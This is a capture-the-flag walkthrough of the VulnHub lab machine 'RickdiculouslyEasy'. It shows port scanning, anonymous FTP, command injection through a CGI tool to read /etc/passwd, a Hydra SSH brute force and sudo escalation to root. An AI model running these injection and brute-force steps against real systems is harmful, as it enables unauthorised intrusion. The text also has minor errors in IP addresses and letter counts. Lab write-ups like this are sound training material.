# VulnHub Walkthrough: Rickdiculously Easy

RickdiculouslyEasy Walkthrough

### Details
* Name: RickdiculouslyEasy ([VulnHub](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/))
* Goal: Get 130 points worth of flags!

### Initial Network Scan
```bash
sudo netdiscover
```
From the network scan we find that the target IP is `192.168.1.53`.

### Network Scan
Now we look into doing a more indepth scan of the target machine to locate any open ports.

```bash
# Scan ports 0-65535
nmap -A -p0-65535 192.168.1.10
```

There were several interesting things that I received from the nmap results:
* **10 POINTS** (port 21): I noticed that the nmap scan found a file called "FLAG.txt" on the FTP server.
   ```bash
   ftp 192.168.1.53 -p 21

   > Name (192.168.1.53:me): anonymous
   > Password: anonymous
   > ls
   - FLAG.txt     pub/
   > get FLAG.txt
   > exit

   cat FLAG.txt
   > FLAG{Whoa this is unexpected} 
   ```
* **10 POINTS** (port 13337): I noticed in the nmap output, that on port `13337` there is a flag: *FLAG:{TheyFoundMyBackDoorMorty}*
* There are 2 HTTP ports: `80` and `9090` - Note: Checkout later
* There are 2 SSH ports: `22` and `22222` - Note: Checkout later

As mentioned above, I noticed within the nmap scan, there are 2 HTTP ports open (`80` & `9090`), so I decided to run a more in-depth nmap scan to enumerate HTTP.

```bash
# Scan all ports, enumerate HTTP, etc.
sudo nmap -sC -sV -A -O -p- -T4 -script http-enum 192.168.1.53
```

Results
* Port `80`: `/robots.txt` | `/icons` | `/passwords`
    * **10 POINTS**: I found a flag when visiting `http://192.168.1.53:80/passwords` : *FLAG{Yeah d- just don't do it.}*
    * Within the `/passwords` directory, I also found a html file with a password: *winter*
* Port `9090`: `/blog/`
    * **10 POINTS**: When visiting `http://192.168.1.53:9090`, there was a password on the frontpage: *FLAG {There is no Zeus, in your face!}*

### HTTP directory enumeration

Before I start exploring the website, I want to run a gobuster, nikto, and dirb scan to see if there are any hidden directories.
```bash
# Gobuster scan: Big wordlist
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -t 20 -u http://192.168.1.53

# Nikto scan
nikto -h http://192.168.1.53

# dirb scan
dirb http://192.168.1.53
```

---------------------------

Once checking the robots.txt file, I found that it mentions */cgi-bin/tracertool.cgi*. Once visiting the page, I then found
that I could execute commands, just as long as I insert `;` at the front.

- To test it, I first ran: `; ls`, which displayed the 2 files shown in `robots.txt`
- Next I tried `cat /etc/passwd`, which simply displayed an ASCII image of a cat. So that means the cat command is fried.
- Alternatively, I tried using `tail /etc/passwd`, which worked fine.
  
The output of running `tail /etc/passwd` on the `http://192.168.132.53/cgi-bin/tracertool.cgi` page is:
```
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```

From here we see that there are a couple of users with a `/bin/bash` access:
- `root` | `RickSanchez` | `Morty` | `Summer`

From here I decided to try the password I found earlier `winter`:
* It didn't work with port `22`, but it did with port `22222`:
    ```bash
    ssh Summer@localhost.localdomain -p 22222
    ```

--------------------

## Summer

Once logged into to Summer, I ran `ls` and immediately found a flag.
**10 POINTS**
```bash
tail FLAG.txt

> FLAG{Get off the high road Summer!}
```

-----------------------

I then explored the user directories.

I began by looking in `Morty`'s directory, which there are 2 files: `journal.txt.zip` & `Safe_Password.jpg`.

I figured the *.jpg* would be a good place to start. So in order to use my tools, I first need to gain access to the file.

So what I did is I started up a python server so I could access the files on the machine:
```bash
python3 -m http.server
```

From there I was able to access/download the files directly onto my machine.

When I tried using exiftool to check if there was any useful information in there I only really saw:
```text
Warning        : [minor] Skipped unknown 59 bytes after JPEG APP13 segment
```

After seeing this I simply assumed there were parts within the image that exiftool was unable to interpret as being part of the
image. So then I tried to print the contents of the picture via the command line using `less`:
```bash
less Safe_Password.jpg
```

Towards the top of the file of the file, I saw a message:
```text
The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
```

**20 POINTS** I then figured that I could then use it to extract the contents of `journal.txt.zip` since it was encrypted with a password.
Using the password `Meeseek` worked and returned a file called `journal.txt`, which inside it said:
```text
FLAG: {131333} 
```

--------------------------------------------

**20 POINTS** I looked in `RickSanchez`'s profile, and found a file in `RICKS_SAFE` called `safe`. I tried to execute it but you need *sudo*
priveleges. I then tried to copy it to a temporary directory to see if anything would change:
```bash
mktemp -d
> /tmp/tmp.7vJ4VBEnFZ

cp safe /tmp/tmp.7vJ4VBEnFZ
./safe
> Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAAHHHHAHAHAGGGUMENTS!

./safe 131333
> decrypt:     FLAG{AND Awwwaaaaayyyy we Go!}
> Ricks password hints:
> 1 uppercase character
> 1 digit
> One of the words in my old bands name. 
```

So after a bit of googling we find that rick's old bands name is *the Flesh Curtains*

----------------------------------------

I then used this to generate a list of all of the passwords:
* First Condition: 1 Uppercase character: [A-Z] ===> 27 Possible Characters
* Second Condition: 1 digit: [0-9] ===> 10 Possible digits
* 1 of 2 words: "Flesh" | "Curtains" ===> 2 Possible words

27 * 10 * 2 = 540 total possible passwords

```bash
hydra -l RickSanchez -P password_list.txt ssh://192.168.1.53:22222 -t 6

> [22222][ssh] host: 192.168.1.53    login: RickSanchez     password: P7Curtains
```

Once I got the password I then tried to ssh into this user's account
```bash
ssh RickSanchez@192.168.1.53 -p 22222
```

I was going to try and run the command below, but then instead decided to run `id` instead:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

When  running `id`, I didn't notice anything in specific. I though `10(wheel)` looked interesting because of the note on the `./safe`,
which mentioned `sudo is wheely useful`. I tried running `wheel sudo`, which didn't do anything, then tried `sudo wheel`, which 
returned an error that `wheel didn't exist` or something like that.  This is when I then realized that I possibly had straight up
sudo access.

**30 POINTS** Finally, I ran the following command to gain *root* access:
```bash
sudo -i

$ less FLAG.txt
> FLAG: {Ionic Defibrillator} 
```

This totals **120 points**. I am missing 10 points and will need to find them later, but now thats it.
